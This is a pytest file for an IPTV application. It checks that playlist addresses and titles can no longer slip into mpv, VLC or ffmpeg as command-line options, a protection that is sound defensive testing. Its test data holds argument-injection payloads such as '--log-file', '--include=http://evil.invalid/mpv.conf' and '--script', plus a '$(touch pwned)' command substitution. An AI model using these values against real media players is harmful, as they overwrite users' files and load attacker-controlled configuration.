"""An address is never an option of the player it is handed to.

A playlist's line is whatever its author wrote. One that starts with a dash
went to an external mpv or VLC as an option of theirs: "--log-file=..."
overwrote any file of the person's with mpv's log (the title, also the
playlist's, written into it), "--include=http://..." took mpv's whole
configuration from another server. The address goes after "--" now.
"""

from __future__ import annotations

import shutil
import subprocess

import pytest

from dopeiptv.media import players

EVIL = ("--log-file=/tmp/x", "--include=http://evil.invalid/mpv.conf", "-v",
        "--script=/tmp/x.lua", "--sout=#std{access=file,dst=/tmp/x}")


@pytest.mark.parametrize("player", ["mpv", "vlc"])
@pytest.mark.parametrize("url", [*EVIL, "http://h.invalid/live/1.ts", "/films/a.mkv"])
def test_the_address_comes_last_after_the_end_of_the_options(player, url):
    cmd = players.player_command(player, "/usr/bin/" + player, url, "A title")
    assert cmd[0] == "/usr/bin/" + player
    assert cmd[-2:] == ["--", url]
    # Nothing of the address before the "--".
    assert url not in cmd[:-2] and cmd.count("--") == 1


@pytest.mark.parametrize("player", ["mpv", "vlc"])
def test_a_title_that_looks_like_an_option_stays_a_title(player):
    cmd = players.player_command(player, "/usr/bin/" + player, "http://h.invalid/1.ts",
                                 "--log-file=/tmp/x")
    head = cmd[1:cmd.index("--")]
    if player == "mpv":
        assert head[0] == "--force-media-title=--log-file=/tmp/x"
    else:
        # VLC takes the word after --meta-title as its value, whatever it is.
        assert head[:2] == ["--meta-title", "--log-file=/tmp/x"]


def test_launch_player_starts_that_command(monkeypatch):
    seen = []
    monkeypatch.setattr(players, "find_player_executable", lambda _p: "/usr/bin/mpv")
    monkeypatch.setattr(players.subprocess, "Popen", lambda cmd, **_k: seen.append(cmd))
    players.launch_player("mpv", "--include=http://evil.invalid/x.conf", "T")
    assert seen == [players.player_command(
        "mpv", "/usr/bin/mpv", "--include=http://evil.invalid/x.conf", "T")]
    assert seen[0][-2:] == ["--", "--include=http://evil.invalid/x.conf"]


def test_the_mpv_recorder_takes_the_address_after_its_options(tmp_path, monkeypatch):
    """The recorder without ffmpeg is mpv: the same rule."""
    from PyQt6.QtCore import QSettings

    from dopeiptv.core import recording
    from dopeiptv.core.recording import RecordingManager

    s = QSettings("dopeIPTV-test", "recdash")
    s.clear()
    s.setValue("recordings_dir", str(tmp_path))
    rm = RecordingManager(s)
    seen = []

    class FakeProc:
        def __init__(self, cmd, **_kw):
            seen.append(cmd)

        def poll(self):
            return None

    monkeypatch.setattr(recording.subprocess, "Popen", FakeProc)
    monkeypatch.setattr(RecordingManager, "recorder",
                        staticmethod(lambda: ("mpv", "/usr/bin/mpv")))
    evil = "--log-file=/tmp/x"
    rm._spawn({"url": evil, "title": "T", "stop": 9e12})
    cmd = seen[0]
    assert cmd[-2:] == ["--", evil] and evil not in cmd[:-2]
    assert any(a.startswith("--stream-record=") for a in cmd[:-2])
    assert any(a.startswith("--length=") for a in cmd[:-2])

    # ffmpeg takes it as -i's value: never an option either.
    seen.clear()
    monkeypatch.setattr(RecordingManager, "recorder",
                        staticmethod(lambda: ("ffmpeg", "/usr/bin/ffmpeg")))
    rm._spawn({"url": evil, "title": "T", "stop": None})
    cmd = seen[0]
    assert cmd[cmd.index(evil) - 1] == "-i" and cmd.count(evil) == 1


@pytest.mark.skipif(shutil.which("mpv") is None, reason="needs mpv")
def test_the_real_mpv_writes_no_file_an_address_names(tmp_path):
    """mpv itself, as it is installed here: the "address" that was a
    --log-file is now a file it cannot open, and nothing is written."""
    target = tmp_path / "clobbered.txt"
    target.write_text("the person's own file\n", encoding="utf-8")
    cmd = players.player_command("mpv", shutil.which("mpv") or "mpv",
                                 f"--log-file={target}", "T' $(touch pwned) '")
    cmd[1:1] = ["--no-config", "--vo=null", "--ao=null", "--no-terminal"]
    done = subprocess.run(cmd, cwd=tmp_path, stdin=subprocess.DEVNULL,
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                          timeout=60, check=False)
    assert done.returncode != 0                      # nothing by that name to play
    assert target.read_text(encoding="utf-8") == "the person's own file\n"
